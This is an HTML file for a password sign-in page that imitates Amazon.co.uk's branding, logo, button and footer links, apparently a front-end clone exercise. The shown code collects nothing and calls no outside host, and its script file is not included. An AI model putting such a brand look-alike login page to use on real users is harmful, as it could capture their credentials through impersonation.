<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/ionicons@4.5.10-0/dist/ionicons.js"></script>
    <title>Sign in!</title>
</head>
<body>
    <header class="w-full flex items-center justify-center h-20">
        <a href="/index.html"><img src="/img/amazon-logo-black.png" alt="Amazon Logo" class="w-32 min-h-max"></a>
        <span class="ml-1 relative bottom-1">.co.uk</span>
    </header>

    <main class="w-full flex justify-center border-b-2">

        <!-- sign in card -->
        <div class=" border rounded border-zinc-300 space-y-4 p-6 lg:w-3/12 md:w-4/12 sm:w-4/12 w-6/12 mb-20">
            <h3 class="text-3xl">Sign in</h3>

            <div class="email-insert text-sm tracking-wide">

            </div>

            <form action="" class="space-y-3">
                <div class="flex flex-col space-y-1">
                    <label class="font-bold text-xs" for="">Password</label>
                    <input id="password" type="password" class="w-full border rounded border-zinc-300 focus:outline-0 pl-2">
                </div>

                <div id="invalid-password" class="hidden">
                    <span class="flex justify-center text-red-700 text-xs"><ion-icon class="text-lg mr-2" name="alert"></ion-icon>Enter your e-mail address or mobile phone number
                    </span>
                </div>

                <div>
                    <a id="sign-in-button" href="#"><div class="bg-yellow-300 text-sm flex items-center justify-center rounded w-full h-7 border border-amber-500 cursor-pointer hover:bg-yellow-400 hover:border-amber-500">
                        <h3 class="p-4">Sign-in</h3>
                    </div></a>
                </div>
            </form>

            <div class="flex items-center space-x-2">
                <input type="checkbox" name="" id="">

                <div>
                    <span class="text-sm">Keep me signed in.</span>
                </div>

                <div id="details-button" class="flex items-center justify-center">
                    <span class="text-xs hover:underline text-blue-500 hover:text-orange-500 cursor-pointer pt-1">Details</span>
                </div>
            </div>
        </div>

    </main>

    <footer class="h-screen">
        <div class="flex justify-center space-x-10 mt-4 bg-white">
            <div class="">
                <span class="text-xs hover:underline text-blue-500 hover:text-orange-500 cursor-pointer pt-1">Conditions of Use</span>
            </div>
            <div>
                <span class="text-xs hover:underline text-blue-500 hover:text-orange-500 cursor-pointer pt-1">Privacy Notice</span>
            </div>
            <div>
                <span class="text-xs hover:underline text-blue-500 hover:text-orange-500 cursor-pointer pt-1">Help</span>
            </div>
            <div>
                <span class="text-xs hover:underline text-blue-500 hover:text-orange-500 cursor-pointer pt-1">Cookies Notice</span>
            </div>
            <div>
                <span class="text-xs hover:underline text-blue-500 hover:text-orange-500 cursor-pointer pt-1">Interest-Based Ads Notice</span>
            </div>
        </div>
        <div class="flex justify-center space-x-10 bg-white mt-4 text-sm text-slate-700">

        </div>
    </footer>
    
    <script src="/js/password.js"></script>
</body>
</html>
